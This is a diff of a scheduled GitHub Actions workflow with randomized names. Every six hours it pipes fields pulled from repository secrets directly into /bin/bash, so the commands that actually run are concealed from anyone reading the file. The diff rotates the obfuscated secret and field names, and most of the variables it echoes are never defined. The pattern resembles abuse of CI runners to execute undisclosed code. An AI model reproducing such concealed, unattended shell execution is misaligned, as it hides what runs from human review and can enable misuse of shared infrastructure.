@@ -1,29 +1,18 @@
 name: caifengjin4516
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '5 4/6 * * *'
+    - cron: '54 4/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: caifengjin4516
         env:
-          tgg49: ${{ secrets.tgg49 }}
+          xb43: ${{ secrets.xb43 }}
         run: |
-          echo $tgg49 | jq -r .vd13 | /bin/bash
-          echo $tk47779 | jq -r .mnfp748 | /bin/bash
-          echo $aw4 | jq -r .w19 | /bin/bash
-          echo $ts20 | jq -r .eqnd19 | /bin/bash
-          echo $nq41593 | jq -r .ap58 | /bin/bash
-          echo $a484 | jq -r .giujp6932 | /bin/bash
-          echo $pzilg7 | jq -r .so94 | /bin/bash
-          echo $yn8 | jq -r .hmq05649 | /bin/bash
-          echo $zkllo1732 | jq -r .ee0832 | /bin/bash
-          echo $vb701 | jq -r .al7530 | /bin/bash
-          echo $t7040 | jq -r .j2368 | /bin/bash
-          echo $cvxte0730 | jq -r .aary616 | /bin/bash
-          echo $lw65684 | jq -r .xbxpw7640 | /bin/bash
+          echo $xb43 | jq -r .ryjau7068 | /bin/bash
+          echo $gkdrx8364 | jq -r .ubl977 | /bin/bash
 
